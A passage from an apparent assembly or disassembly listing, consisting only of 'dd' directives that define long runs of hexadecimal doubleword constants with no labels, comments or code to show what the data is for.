		dd 6207CF6Fh, 0F6DD739Bh, 20838EF8h, 1B7FD087h,	39B8DE87h
		dd 63569594h, 35C4C9B5h, 0AD9417ADh, 47EEF4h, 0D3AE20B7h
		dd 0B84E1A2Bh, 613D11D3h, 86218FE0h, 227E59F8h,	4490660Dh
		dd 13033FBh, 0D40B6F1Fh, 0C9F6BB6Ch, 0EE8BC584h, 0C81F2AA4h
		dd 0E861CCD9h, 2C26C08Dh, 8DB28911h, 2DD0AD27h,	79DA4958h
		dd 0A74BD1A8h, 0A7A49964h, 93C8DAE4h, 0EBF72B35h, 44D20845h
		dd 364DA452h, 0A01DE16Eh, 77A6A8A2h, 0C0A7EA41h, 224FEC6Fh
		dd 460A804Ch, 6A280A19h, 6BECDA27h, 0ECD7D1DCh,	0DD297287h
		dd 878BCF3Bh, 7AF59F4h,	447A0F95h, 6E26158h, 3B1816BDh
		dd 0C9A0310Ah, 9FD09718h, 5DE20B78h, 294D760Fh,	0B971BDE8h
		dd 0FF12FAB7h, 51651139h, 127B367Bh, 0C0618EDAh, 2EDBEC19h
		dd 0D930CD2Bh, 0F847336h, 0E24E3EDh, 41F507EFh,	0A7156F1Bh
		dd 46A35FDEh, 0C0C60C5Eh, 0CCF5446Eh, 7F3C415Bh, 0C022DC8Ch
		dd 1A839284h, 0F2EAAB59h, 0F82582A6h, 0E441FF6Bh, 107517C2h
		dd 17027E0Ah, 8CBC6D29h, 0AFD08E51h, 0C1440E72h, 0E1287DFEh
		dd 0C42DBB60h, 0AF06C9B0h, 0B5E66BA6h, 77FA45BCh, 0C3235560h
		dd 0ACE4CBD2h, 0C68EC511h, 0CA218F14h, 0E1BC594h, 716E9164h
		dd 0ECB667F0h, 1ABE9AB7h, 2774D604h, 0E147719h,	7515430Ch
		dd 9E741660h, 8AC830Fh,	66720961h, 2DB2EAD2h, 0F9029BC4h
		dd 0E771F1B9h, 4B005067h, 84AA878h, 35A4CD96h, 0C764E183h
		dd 0D9675B16h, 54329065h, 8DAECBB5h, 10BE2D21h,	42F2AB16h
		dd 0ADA2B203h, 848F97C0h, 0D214535Dh, 370B867Bh, 0BCDE7C23h
		dd 7D4917F1h, 0A96C3C67h, 756A7588h, 0C86017ACh, 853572EEh
		dd 2DA33A35h, 55E8D41h,	0BE9DE0E7h, 62C6A82h, 29106E6Eh
		dd 3274AF35h, 0F4C43588h, 0CA5D1CDCh, 1E369620h, 226A03FAh
		dd 5222EA9Fh, 0BBFFDD82h, 120F0DA1h, 922B24A8h,	394AA1A8h
		dd 622AAE92h, 2ADBE9D2h, 0A46E0454h, 25E0B8CEh,	0DD2C6E97h
		dd 4405AAC8h, 75F009D0h, 0FDE9783Ah, 5296E06Fh,	8D17C418h
		dd 4EA1249h, 0B888AC4h,	0AA2E1802h, 0B073D1ACh,	0F317112h
		dd 0C15B8280h, 2D5E5691h, 0F0FA4EDDh, 24FEB079h, 1879D63Fh
		dd 7761DB7Ch, 0A47BA0D4h, 55BD0353h, 79319CE2h,	0C7248F0h
		dd 92504048h, 94CAA178h, 3488C7A9h, 0E70DE9A3h,	0D37583Dh
		dd 48070D7Dh, 6BBDBD6h,	3BED4EF4h, 0CCD02D8Eh, 0CBC73BD2h
		dd 76CD1D08h, 8A3E5EB8h, 7D621AE5h, 15A1B071h, 0A2C673C2h
		dd 0A66BC3D6h, 6AB129C2h, 29A84553h, 2860676Eh,	0EB524934h
		dd 0E31FDB17h, 0F3C1FB49h, 0E310C4CDh, 757A39A8h, 2D604CC6h
		dd 8171F6FAh, 62860217h, 0B3C9ADD1h, 7FE31AC8h,	6A1C27F2h
		dd 19594A63h, 5710F581h, 0D9F2BD08h, 44183408h,	69CB23F8h
		dd 0A8F5E4ECh, 69F58459h, 2CE496C1h, 0FD283235h, 2D1DD495h
		dd 0CA759EF2h, 2853CC00h, 0DF7B422Ch, 0BF7BE7F8h, 5B81C9E5h
		dd 53C08CA7h, 867D1426h, 0C8F073DDh, 0E82F074h,	0E0128BEh
		dd 0D9296C13h, 103DF573h, 0A731C37Ah, 0CD89CDA6h, 0FF035D78h
		dd 0D35F1ACh, 0E5B7556Ch, 83232A3Ah, 6BACC605h,	1FF723C4h
		dd 0CA85E689h, 0D4629B06h, 83CBA567h, 511645EFh, 6D7822AAh
		dd 2AA3AD80h, 712C92C4h, 71925926h, 2F4C9442h, 0E1E7910Fh
		dd 0C1BF5F11h, 0D7312430h, 1847D699h, 5A9B5D2Ch, 356A7342h
		dd 4AE5CEB4h, 8BAF709Ch, 1186D440h, 11B090FAh, 0C14FFCB5h
		dd 2BA308F4h, 4A81C5F3h, 9ECE0BDBh, 8A2B1CEEh, 1AD0944Bh
		dd 48B05F70h, 3E062676h, 9DBC4480h, 3F75D66Bh, 0A5FFFEAh
		dd 317C08B6h, 611ADD31h, 0A64DFCAEh, 7803B8Fh, 7BA3D3B6h
		dd 0A0B31814h, 44C5E0E4h, 73B7D8C4h, 51C17B4Ch,	0FE9E943Ch
		dd 6F8C682Ch, 5FA65352h, 0AF7D188h, 921E91FAh, 9AA1A6CAh
		dd 9A33EA0Eh, 0A7F2AABDh, 341A87A2h, 0E2A0DA6Dh, 7EBCFA91h
		dd 0B8CB348Ch, 5411B5CEh, 7A3ACE7Eh, 7F63BCE3h,	511923A4h
		dd 0A033E459h, 4B235A6Eh, 11291249h, 0E5523F52h, 0D6E687EAh
		dd 461B0DA6h, 77314CC8h, 0CF732CFh, 182EC7EBh, 49AE37A1h
		dd 52A21269h, 0C5F978E0h, 0FD5EED7Fh, 38D3BEF9h, 3BFC1156h
		dd 4203BE5Ch, 0B0514CC4h, 6AA33384h, 85841E03h,	3D6C5AAh
		dd 8C4A76F1h, 0EF605A33h, 1BD1E01h, 0AA13BD62h,	0F9656D84h
		dd 0E5040B64h, 72D7CE88h, 0DC9CCBC7h, 8FC27E5Ch, 71DDA62Ah
		dd 5398E003h, 581710F3h, 20176E4Ah, 0EA33C8B2h,	365C75F6h
		dd 8A08BE8Ah, 185147DBh, 0AFBFAF53h, 0A974A2EEh, 789EC95Bh
		dd 496CABD1h, 0E39CEB6Dh, 3FA09150h, 9EA9BEECh,	9E9750AFh
		dd 0E1F256A4h, 86CE379Fh, 1529C5E8h, 5E41ECE2h,	0F8060108h
		dd 4BBD325h, 0FBE26CC6h, 0CFB288CBh, 8BC8DDFBh,	0A257FC17h
		dd 9F1166FFh, 9F08E650h, 53B7811Dh, 681A4EFh, 0AA235427h
		dd 0FCB42605h, 0F00FB7A5h, 0D7C3E241h, 0EC8C24C1h, 0E7349DEAh
		dd 89597E6h, 95B47CBCh,	93EAD118h, 0BF73B7DAh, 99EAC6B1h
		dd 0F000448Dh, 244BEC86h, 0A2172FF1h, 872174F0h, 34D04DAFh
		dd 9A14C7BEh, 6BD7050Dh, 8FEDD147h, 4C28045Bh, 3EF784FCh
		dd 0C4F7CDE3h, 6FDF6836h
		dd 3CEC125Dh, 0E5D1E5B3h, 0CCE7F6A2h, 18BFE707h, 5ACED61h
		dd 0C693E627h, 50AC7A12h, 53C2A44Eh, 4B31BAAFh,	0AFAA7A25h
		dd 0B17D6124h, 39716A00h, 1E1C2965h, 0CBA4D7A9h, 4E197027h
		dd 9CAC1727h, 0BF710373h, 0A167A54h, 0D80CFD88h, 0F5499C1Dh
		dd 0FAF4FC54h, 0DAF6958Ch, 3BF0507Fh, 8445F88Bh, 51216A05h
		dd 8BA78765h, 0C823C002h, 0E6A0EA49h, 626AD3C0h, 2F25AFC8h
		dd 3B9E574Eh, 625AF58Ah, 0DED19790h, 900F896Ch,	0A0CDD5CDh
		dd 0D70DB2Dh, 3E29FA85h, 0C3FB93A8h, 280552BAh,	41508DEBh
		dd 0D500F6ECh, 0EA925E70h, 5094B63Dh, 4797F1F1h, 5C18138Ah
		dd 0C17F6CD6h, 79A82B6Ah, 3EBC8803h, 0E3D29C62h, 8672CFC3h
		dd 0EC6610C0h, 38E50B1h, 7801A5BEh, 0C450ACD7h,	1FCDD0BAh
		dd 2FF3C871h, 421E323Eh, 2B6948B0h, 8AE3CD05h, 0EA469957h
		dd 0BC4A3023h, 812577h,	0FE518A8Bh, 0DFBC2EB1h,	8B31E016h
		dd 3015129h, 0E9B52228h, 0C14F00E9h, 0F3C44A36h, 0CD60F378h
		dd 4754243Ah, 81B71F9Dh, 72187D2Ah, 0D25369B7h,	309252D2h
		dd 0EAE3BDD4h, 5E273CA6h, 2FBD7A8Bh, 0A8DC7659h, 0FD21D104h
		dd 4D9F8BD7h, 0E2D68715h, 0FFA6ED2Bh, 67A3FC24h, 0D2725145h
		dd 0B71AAEE1h, 0C9B12C87h, 819D2F24h, 0AAB55488h, 8D7BF23h
		dd 0A6ECF1CAh, 1BD7148Bh, 44D9C118h, 7E4A96FDh,	0FD4E80D9h
		dd 0DC7DE3DEh, 0E1C4F559h, 0C8DF1FD1h, 0D544157h, 1BA5A01Dh
		dd 2B43B00Eh, 8F5A3057h, 210EDE5h, 0D7CB68F9h, 71450853h
		dd 8E2A29BFh, 0EE93AFA9h, 8BAC2E45h, 0AE0B5D80h, 0C3887112h
		dd 0AFA369D8h, 0F91FDF5Dh, 1F74FCCFh, 0C6EFB212h, 0B432F0FAh
		dd 0DE743D40h, 455E7F5Dh, 0DB149E74h, 642A8BE7h, 0F255A251h
		dd 350574EFh, 0AD2E0B43h, 0F9D87271h, 0E83A18C9h, 0B9DD3917h
		dd 362CD879h, 8C02CD6Ch, 8F3AFEF1h, 23504D95h, 0A2B09187h
		dd 0B40FFE34h, 0C41A1490h, 0D52D000Eh, 0F529B913h, 0E5737FB2h
		dd 7D99D2E1h, 52E5C32Bh, 9849923Dh, 99C24B8Dh, 5D6DD50Fh
		dd 4AE49A19h, 91E2D7FFh, 966C375Ah, 0FA446372h,	0F6D37966h
		dd 0AA968B83h, 13BDBACDh, 3BF473ABh, 638A4FE7h,	0E1C96E9Dh
		dd 1A661772h, 6F844907h, 2361EC9h, 743442D2h, 0C3F1CDAh
		dd 0F6F5E088h, 0DFD2EDD3h, 73B99053h, 0F83F9562h, 64743760h
		dd 9DD5F71h, 62FC556Fh,	0A7E19690h, 82721DCAh, 0B6C6B858h
		dd 10D465B8h, 0ED9C8C7Bh, 5FC521h, 1345C0DEh, 6F4B9547h
		dd 0D54FE0E6h, 38FB6F28h, 77B7D1EFh, 7440FC6h, 96B2848Eh
		dd 0AE016456h, 0BA10DE4Fh, 35A43350h, 4B3AF8B5h, 0D132A754h
		dd 0ED99AC9Bh, 0E5B30C10h, 0C7023C62h, 0F95ECB67h, 9ACBD4F9h
		dd 1E2E60CAh, 0BC32024Eh, 0D2A62BCAh, 4E1EEE08h, 0DA2711DFh
		dd 407364B7h, 118A3290h, 0DF05E8E0h, 1851CA43h,	38859353h
		dd 4DC44E13h, 561D1F6Dh, 979C83Bh, 0D6DADA74h, 2B021AE0h
		dd 0E11AF342h, 6E0B5788h, 51F8EDC4h, 619299FEh,	0B07972E9h
		dd 0A44CBDD4h, 0DFAE1FC5h, 71C69A78h, 6B4F58FBh, 0A9BF41A4h
		dd 0FAF67D79h, 9D336CB8h, 0A7247FA3h, 0E536B2CCh, 0DB0D88CBh
		dd 14E8F777h, 0DFABBB8Fh, 0B29DCE39h, 0A8830677h, 0FC56A5FFh
		dd 36F66333h, 0F787497Dh, 0C3A2440Eh, 0E1477F5Ch, 2C79CFA5h
		dd 0B63979B9h, 604AF3EEh, 0F0E70ED0h, 9229116Eh, 7BDF0256h
		dd 0DB53886h, 21805357h, 0FED7E9Dh, 0B4BCEDAAh,	0BCC2D55Ah
		dd 2AB351BFh, 0A80B1068h, 50755314h, 0FB208581h, 7CD05AE4h
		dd 0D034B0F5h, 8A8F67C0h, 0DF2F03FBh, 6DD6B8E5h, 38515E41h
		dd 0A6F196B4h, 0F9261585h, 334E886Fh, 59C4D06Ch, 33F60930h
		dd 1D7368BAh, 9F2B9D23h, 8555AE32h, 6FD323A3h, 0D1F8D882h
		dd 7DA9444Eh, 0BEF27994h, 0FCE49078h, 294C646Fh, 0A4BE39h
		dd 0BF9ECCC2h, 0F6FC3E98h, 92675253h, 6A9F3792h, 0F7B07D9Ah
		dd 497748EFh, 26CA1188h, 78C3ED4Fh, 0D2825EA8h,	0BE70C27Bh
		dd 0E9E22797h, 0C1785073h, 0C49D38F1h, 4080C999h, 0E0972EB2h
		dd 89E56427h, 0AA12D59Ch, 0EE8C3D14h, 9820264Ch, 33656555h
		dd 0ADDBBE96h, 89198485h, 383B2340h, 0B4C0B27Ah, 23C8956Bh
		dd 0A9367B3Bh, 594642D9h, 0EF3216Bh, 0FEC87579h, 8078B18Fh
		dd 0F6E9C068h, 906DA810h, 46A6DB5Ah, 8019C30Ah,	0AE6FCA2h
		dd 0DFC0B8ECh, 48206BA3h, 607AACh, 0A4A4F257h, 38973EC3h
		dd 0C29AE581h, 45278C35h, 0A9D12EBEh, 4819C2FFh, 5447E090h
		dd 30E8BD9Bh, 16E8A517h, 0C181F055h, 2C03D938h,	18459984h
		dd 9145BB82h, 6CDE9B19h, 5FDFA5B4h, 5515D06Bh, 0DD9B9CB5h
		dd 132D5F9Dh, 0E964CD28h, 747F6D08h, 2D8BB571h,	0EBDBC616h
		dd 0D442B84Eh, 1A0CB6B6h, 0BAEBA2C9h, 28517AC3h, 5A69F37Fh
		dd 0B3D29D6Ch, 6111AFAFh, 583FE918h, 87DE44EEh,	94DA5821h
		dd 1A3B92A6h, 0BFB4B181h, 6BF676F7h, 4DC7A81Ah,	0DD5FA7E1h
		dd 36C452DDh, 3B17A7E6h, 95C09C5Ah, 0D9B88430h,	0E0E6B88Bh
		dd 0ACDEBAEDh, 2BB21E6Dh, 6A2E114Dh, 19357264h,	0DFEDC447h
		dd 69EB8393h, 7A1B130Dh, 9EAFDB1Ch, 53DF153Ch, 0FD8E5A53h
		dd 0A63516B8h, 0B38F6467h, 5B436E33h, 0FB4016D4h, 0CB72A454h
		dd 0ED77F3Eh, 0FCFEAF6Eh, 4CEF6FD4h, 63440C84h,	6C5186A4h
		dd 0F83AF9A4h, 0F0C2429Ch, 6FD4BB34h, 0DCFA85BAh, 684FC123h
		dd 0C4124001h, 6B6E9226h, 511F69D9h, 0D59D547Bh, 80E1DEB7h
		dd 162DEFE0h, 0A89C4B6Eh, 37DC54E2h, 0DB37A8CAh, 0A75A3AC6h
		dd 79F143E2h, 8F3BA7DDh, 0EE8A9DB9h, 2A8961F9h,	247C76B9h
		dd 5E3E632Fh, 1F1936F7h, 1E051ABFh, 839D00EEh, 65C4985h
		dd 489F8327h, 0C532D36Fh, 0E42DC1E6h, 0B25A24AEh, 683B266h
		dd 21A7CB09h, 16214204h, 0A6A0F79Dh, 0DC58BB69h, 7321A3AEh
		dd 0BF959FFCh, 6BA29AA1h, 7C326536h, 40E142B2h,	0B83BDD75h
		dd 4E897EC3h, 0E8F33007h, 0F2EFF313h, 5B4D3F17h, 4B2CD321h
		dd 0AEB7686h, 0E58438B2h, 63451E6h, 54997EF1h, 69832714h
		dd 0C72BFE2h, 752F4688h, 4BA7D98Ch, 148F3373h, 0FE470D0Fh
		dd 576D9C1Bh, 73A8F318h, 1E633FCDh, 0D3388664h,	0DB509F52h
		dd 0A026ABD7h, 7E17E089h, 5D3FAC26h, 991614Dh, 3A085027h
		dd 1852250Fh, 36EB0A35h, 1F525271h, 433F1917h, 21D8AE4Bh
		dd 7FE068ACh, 8C0E3D1Dh, 0F4222424h, 7354912Ah,	666F3AF0h
		dd 0CF36ADE4h, 32A89FF4h, 676DD295h, 0FF61BBF8h, 8D42B77Ch
		dd 53AEB165h, 0C1A05AABh, 0F2E308C1h, 2987B13h,	0DE96BEB9h
		dd 0FBDF339Fh, 5F47E6BEh, 0CE82C357h, 8C55C601h, 12001EF0h
		dd 2F145D8Ch, 51D3082Dh, 0F201CEDFh, 904F5B99h,	94DF32F1h
		dd 36374B8h, 0CD13D5D9h, 157B61CDh, 56B205E4h, 3E4FF55Dh
		dd 603F2598h, 44E36292h, 63B59156h, 0DE988DF8h,	0C5D4358Bh
		dd 2351935Eh, 17D0397Ah, 3D0B2541h, 9800E2EBh, 2AF5B6BCh
		dd 3D9DDCE8h, 6F79DEC7h, 9827C869h, 1820F6E6h, 0FC99C002h
		dd 9F9DB2A5h, 33B3A18Ah, 0F0776B83h, 0D88E8B27h, 96DDE4F9h
		dd 0A0EF1CFDh, 6770C3DEh, 0A961705Dh, 0EF8BEAA7h, 0C12F52C8h
		dd 0B6538111h, 210E4624h, 5E26585Bh, 919E78BBh,	0DD8242D0h
		dd 61048292h, 0DD286E8Ah, 0FD3593FAh, 464AAFD6h, 0B0B234D3h
		dd 898F8D8Ch, 0DA69138Ah, 0A7B738Eh, 0FE1F9C95h, 0C118CF49h
		dd 0E4D14F72h, 24F34B4h, 0C6DCD3B2h, 2F591028h,	10F4367Bh
		dd 0A584DBCAh, 0D1053F29h, 0D7604E9Ah, 9D298559h, 0C4902A35h
		dd 0EF8C5AEFh, 0C7D5A7B2h
		dd 0DC28C9F5h, 385BACEBh, 0CC582F99h, 6322DAE6h, 39B83BF7h
		dd 412EA928h, 5CF728E8h, 373FA697h, 8635D6A5h, 9D3EFFEFh
		dd 9A446CA0h, 0EFFD418Dh, 0CF362E4Ah, 0F97A156Ch, 69F5CB42h
		dd 594A8536h, 7E0E5E19h, 0A7D6F743h, 0FCA5B4FCh, 1EEF583Eh
		dd 3513AC3Eh, 8F80E33Dh, 28618E82h, 0DB82274Ah,	801118BBh
		dd 60E028CFh, 38924147h, 7CD0B63Bh, 0A2FB5EE6h,	0A82889EDh
		dd 0ED4551E4h, 0FFCA04DDh, 9646E75h, 424880DFh,	0C65740FAh
		dd 86FA2374h, 0C1E8FDC6h, 0A0931D68h, 0ED149529h, 8055020Ah
		dd 0BF2E04A6h, 45DAE443h, 0EC0A379h, 86EC3E6Dh,	0E6B733DBh
		dd 0C26616EEh, 0E5351AEBh, 7F51FBFh, 706A4C9Ch,	3485811Fh
		dd 1547A59Dh, 4729C617h, 4416EDF4h, 85FAC6D9h, 13BD88E3h
		dd 56B9CB0h, 0E08586EAh, 7282B6Bh, 1D5E9224h, 0C30BA13Bh
		dd 0AE1F1218h, 3A0207B6h, 0D5E3F5Ah, 51A797A1h,	7BD2BE08h
		dd 947CBFBAh, 0A0E05517h, 0A381854Eh, 77975561h, 0E88ECD7Dh
		dd 8347BE9Dh, 0FB5C61C7h, 641E6536h, 1CA85F96h,	7435FFB0h
		dd 978A45A1h, 0EC597C06h, 71A85ABFh, 8D21F6D7h,	85F72744h
		dd 0A1DECD44h, 37B2DB21h, 8E653300h, 45DE97D6h,	572D67FFh
		dd 0A01B1D75h, 568BC177h, 61AEA3BAh, 7FFBAF77h,	0CB73B4C5h
		dd 39CAB35Ah, 7734B700h, 5C474C6Ah, 4DF84982h, 84FA8755h
		dd 133E30DBh, 0B7EB994h, 8B094EDAh, 0FEB49B37h,	0E1CF9D9Bh
		dd 46D96416h, 0DD2CF165h, 2116CD94h, 0D7A51699h, 0F2EE9826h
		dd 8645224Dh, 89E25DE6h, 0FA4E3A73h, 38B3F1ADh,	7FC098E2h
		dd 0B218B900h, 0D9964641h, 0A89594F3h, 7E6E0578h, 0AD7CF46Eh
		dd 0A1CB9801h, 1C660A41h, 0DB478117h, 5868DE01h, 36079FEBh
		dd 0B71EE9DDh, 6DC50F1Bh, 0E613A6EEh, 43AC8862h, 0D966A4EBh
		dd 0B568ACEDh, 0EEB52E29h, 35DACFFFh, 2B015A27h, 3FBCE376h
		dd 1FE058DCh, 1EA1A8F1h, 96B1A608h, 8D31D388h, 62712C50h
		dd 0F8DD9BF0h, 0E0AD42BDh, 2A572C28h, 0B7E8A101h, 0CD74061h
		dd 0DB42B546h, 8E06959Bh, 2E5E5166h, 608D45Bh, 1CA5576h
		dd 5AE6E34Ah, 60E3E10Fh, 91B24BA5h, 0C0B2E381h,	455BF5BAh
		dd 0BCDBD3D9h, 0F005C692h, 0BF9B4F49h, 43EFEA1Eh, 8BF5B192h
		dd 75BAE94Ah, 5FBA2F5Eh, 68C2E896h, 0D303DF60h,	0CE820541h
		dd 90636932h, 0F4D592E1h, 6127A786h, 50265561h,	0D0ADDB4Ch
		dd 0E4409967h, 77489C86h, 6579D48Dh, 0A3A4CED7h, 336E4B5Dh
		dd 0FC340F8Dh, 0D7203847h, 0BED8096h, 2B881B71h, 7542BC5Eh
		dd 0CF2411F6h, 0F8450366h, 8CA067E3h, 2751B416h, 77CDA055h
		dd 0A26C818Dh, 0BFC7AC5Eh, 0BA9CC5CBh, 0D0852436h, 112C0A16h
		dd 30F57610h, 59868C11h, 8C9C8A97h, 8DD440D6h, 58B62B52h
		dd 0A4CDDCF5h, 0DED2A094h, 78038E93h, 264EBF59h, 0CD27459Bh
		dd 55C34791h, 9DFC2275h, 466E2816h, 0C855429h, 0A807BF88h
		dd 0FF6C96FFh, 0DB62E90Ah, 1328B5BDh, 222EDE53h, 0F55E08CFh
		dd 7789E5C2h, 1F5E6103h, 271BCA96h, 37BB7CDCh, 0A16DA830h
		dd 586F12FFh, 0E0DBD7BCh, 0EFDD8CDAh, 0BBAAC58Dh, 0A89A6C24h
		dd 0CC3418F8h, 15ABFFC6h, 0C6807626h, 166A1A9Dh, 8A63FCC9h
		dd 5A86CFFh, 9630EF17h,	270E815Dh, 0AB8E63C0h, 2F1C945Ah
		dd 7F1BE7C2h, 38C82CE9h, 0DF80E7A8h, 70DA649Dh,	199A1E1Eh
		dd 0D3A5C225h, 0BF9766E5h, 22ACD7C1h, 453FE40Dh, 0C255625Ah
		dd 0FC216358h, 3FCFD4DEh, 426BA2DBh, 7A38E295h,	0AB1DCD88h
		dd 2F3B161Bh, 297AE8B0h, 0C7FBBE9Fh, 0CAE26B5Eh, 0AA9307C9h
		dd 731EDD0Bh, 24C9C7C1h, 95529326h, 94A4DF9h, 4EF68209h
		dd 0F238BCFDh, 770EEF36h, 0CDA1C93h, 0F2BF8FAAh, 0A619FBBFh
		dd 57B7D779h, 89C93B48h, 51F997FBh, 8E036E6Dh, 63D5104h
		dd 0B7F9535Fh, 54867724h, 4EF88830h, 5BB94633h,	0C0DD6263h
		dd 41FBBC82h, 72539FA1h, 9AF80513h, 6283E7C0h, 1F5DA214h
		dd 0FD2D4FE0h, 6992AADBh, 0A2D2D196h, 0BA574FD7h, 5D662912h
		dd 0F933E2FEh, 3AE90014h, 0C5C9CFDEh, 81D81EE5h, 0E2391FD2h
		dd 797A5D2Eh, 0BE6D40C2h, 849003E8h, 91FE6020h,	61F0773Ch
		dd 9E63F27Dh, 0DF15AC08h, 89797745h, 9F7A2A8Ch,	909396A3h
		dd 0DDE539F2h, 4E63B000h, 0D6C1373Bh, 15AF06CCh, 98F89063h
		dd 83ECF9FAh, 371B89F7h, 9F7F0AF2h, 0BE4BF91Fh,	0AE9CBF36h
		dd 0E39F1F72h, 0B7B23426h, 10F3E3A3h, 73E65F4Bh, 0E0A168E9h
		dd 0BBA288FEh, 5F6221B3h, 5C8B818Ah, 47D94FEAh,	0E7F1672h
		dd 0BAA196ECh, 0B781737Fh, 0B882E748h, 0EE1ABB3Eh, 37F82A3h
		dd 0A890087h, 0F337FDC6h, 51874149h, 48D70B45h,	2C3C4882h
		dd 7AEC5271h, 2E0F28A5h, 43F7143Ah, 898150A2h, 50EEE6D8h
		dd 953AA633h, 8E3C64CFh, 2906EC3Dh, 0BC665481h,	4AC74208h
		dd 7B166ECAh, 75FC4DC7h, 0A64884FFh, 84C8FA04h,	0C1BCEC01h
		dd 3B764326h, 46C9AB49h, 6F9980E6h, 842D7AAFh, 0D784879Ah
		dd 4EE0BF1h, 3821692Ch,	0E8099BF9h, 3C61A2D5h, 1CC06DBAh
		dd 951AF1F2h, 1EF487D7h, 0F761DA2Fh, 0A6C0325Fh, 0D205643Eh
		dd 13F5B22Ch, 7CF01CE6h, 29086464h, 6B3DFE19h, 9C0C0DF1h
		dd 15419B07h, 0F087CF9Ch, 0D313BF0Ch, 0E01F0F5h, 0EBE3EB93h
		dd 0B4073E22h, 1369B17h, 5764261Dh, 0BCA2F0B0h,	95FBB48h
		dd 58792519h, 5AC769D3h, 451E8E47h, 84069350h, 0A0F17681h
		dd 4B91FCA8h, 9B92423Fh, 0D13DA855h, 4A6561B8h,	171E4C6Eh
		dd 0F9A7526Dh, 3B955AD7h, 0C5FBC989h, 94C1FF1Bh, 1E9841FBh
		dd 91BDD1FFh, 63E53938h, 8EF455B3h, 39A53AEFh, 8CC2A10Dh
		dd 0ED34E171h, 0D39E22E5h, 3E6F72Fh, 1B1FF5DBh,	1328A060h
		dd 0D79C41AEh, 0E373C9E9h, 70649A00h, 0A9E4C868h, 5DFAD1D3h
		dd 0AB94E47Fh, 0F04EE4B7h, 82CEE773h, 9C826A04h, 0E78A320Ah
		dd 0D0034A21h, 71A3C0A0h, 3FF982Ah, 0D220C5Ch, 0C518C4E4h
		dd 0F345E1A1h, 3AB4F4A8h, 0D6D79CAAh, 0F0B978DBh, 34C5A37Dh
		dd 0B03D81D8h, 18842BE2h, 1B434987h, 12C8B65Eh,	4A61CFD1h
		dd 161FFC60h, 0AFF3E515h, 0BCF23F30h, 9B8EE2B4h, 2FD2148Dh
		dd 76903C0Fh, 0ACAF7DFFh, 5CACF8Fh, 36595953h, 924898F1h
		dd 77C075CFh, 0F2CDF2E1h, 6B7D41EDh, 0CA22A9E2h, 839A1073h
		dd 44F50C0Dh, 0F67D0C46h, 2046553Fh, 9A79EB33h,	3683FF47h
		dd 7455ED58h, 0F1BE5EB7h, 4EE82EFBh, 0A28A07C5h, 0EEB1BDA0h
		dd 3EE1174Eh, 0F4B64961h, 49DD631Dh, 0D72086F7h, 0B5B44B8Fh
		dd 0D71281F0h, 0E93CE2DEh, 96BD6073h, 0DA1FAA70h, 5B3427F8h
		dd 0D49908A8h, 0D14535E6h, 0FBB3ECAFh, 0D6871FF8h, 0B2C8DB68h
		dd 527D0521h, 0D432884Bh, 5BF4B424h, 0AF3BD9EDh, 7C041CB8h
		dd 0FE6D039Dh, 0CAAB93Fh, 4E22A7FCh, 0A08CA42h,	67BC6688h
		dd 8D435C5Ah, 4D9DB328h, 89474CE1h, 40D2E61Ah, 0A8F582BDh
		dd 0B6E609D9h, 8A323F99h, 9AFB5246h, 0A3264EDBh, 0A45BA6D3h
		dd 751052CDh, 664E0ABEh, 0B776F4ADh, 7A75C3FDh,	4D2509C6h
		dd 68B242E7h, 99C40CF8h, 1B70DDAFh, 17657436h, 65CD5A75h
		dd 0ED53E1C8h, 2B9CE83Ch, 0CB75F06Fh, 0F70FD322h, 0A5AE5EFEh
		dd 3EB61124h, 57E761E9h, 43BF610Eh, 0BCFB996Fh,	0C685ABA3h
		dd 0B7459CE3h, 7CE3E4E5h, 38E9AA91h, 0E30853E4h, 0E714AAFh
		dd 998128F0h, 8D8C8C42h, 7E18FFFDh, 25BBBA15h, 69C4273Eh
		dd 95999678h, 0ADE55B4Dh, 0F0649BD8h, 7DB3E963h, 2C7018B7h
		dd 0D007BCC4h, 0CC0E77C4h
		dd 17E3F108h, 4627A9ACh, 1B23FF39h, 2490A678h, 2AB44AC7h
		dd 8078AF3Ch, 2E824CE4h, 4DC3455Ah, 9E67282Fh, 85086D75h
		dd 53ABECD7h, 0D2528328h, 0E81EA060h, 0E0FB18C9h, 0C9A567B0h
		dd 801B9CDCh, 8FCC6993h, 42028EADh, 679BCCDDh, 46949F91h
		dd 0E8E6111Ch, 0ED4BA758h, 0AE418119h, 0A625719h, 979BC028h
		dd 0BA586868h, 4CF4CA1Ch, 0A6E4B225h, 4C47D0D5h, 21AF450Bh
		dd 325FF9Ah, 1F04F1FDh,	0CD432673h, 0D5EF6D07h,	6715381Ah
		dd 0F3D83460h, 0B73552B8h, 84F18B5Dh, 0FA3B43D1h, 8128083Bh
		dd 0BBB66A19h, 1B184276h, 0EC34F315h, 0E22A78ACh, 937DA813h
		dd 93936704h, 0BB6EE220h, 4A6B226Ch, 7BCAB769h,	0C7DCC424h
		dd 4168170Bh, 13612CEDh, 0E8DDE7E4h, 0E656B2B0h, 71D15AA5h
		dd 0A50FB90Fh, 389CD329h, 6386EE4h, 0E7967D45h,	43458500h
		dd 4C633ABBh, 0B5B714C5h, 0DAD490ABh, 0F281273Dh, 0B5FDA68Ch
		dd 0C79C1294h, 1C9C09D6h, 6D323622h, 928CEC99h,	20D0DBC9h
		dd 844D42D3h, 33068514h, 8172337Ch, 6B8191DBh, 3D746A8Dh
		dd 0BD7A146Ch, 580239D6h, 93ABA470h, 0D0350EE5h, 4012A47h
		dd 0E67D6DAh, 0FDA744A1h, 0F6305E16h, 4F021DA4h, 0AD11F198h
		dd 560E379Fh, 0C350D4F6h, 5CD402B1h, 0CC892C12h, 44A12F4Ah
		dd 0C73C5248h, 0C27A8274h, 0A2CCC1FAh, 0C3D517EAh, 87B77E1Fh
		dd 34CF75A6h, 8F7DA80Eh, 0EE7BB4CBh, 2CFDBBD3h,	0FAB3301Ch
		dd 1D9804B0h, 0D87FBAF1h, 0F6037584h, 0D94998F1h, 0A2F9C8E3h
		dd 72255FA7h, 0F7573FD4h, 580279C7h, 6D25F53Ch,	0EF69AAE2h
		dd 54A2995Bh, 0A7976008h, 2FC6EECCh, 0C6F7BCE1h, 92903C31h
		dd 0F70BF786h, 2F897D8Ch, 4C172213h, 3D3E1F3h, 8511D1Dh
		dd 3697150Bh, 0FE80C9B1h, 0A0AA89Bh, 0C81D01FAh, 2E11BE0Ah
		dd 87C5C38Fh, 0DBB8C7FDh, 9E3C96B1h, 0CF379260h, 5C81E5A5h
		dd 5A92A1BFh, 0C07E5CD4h, 0C31B478Ch, 48FE4EA5h, 0DF40014h
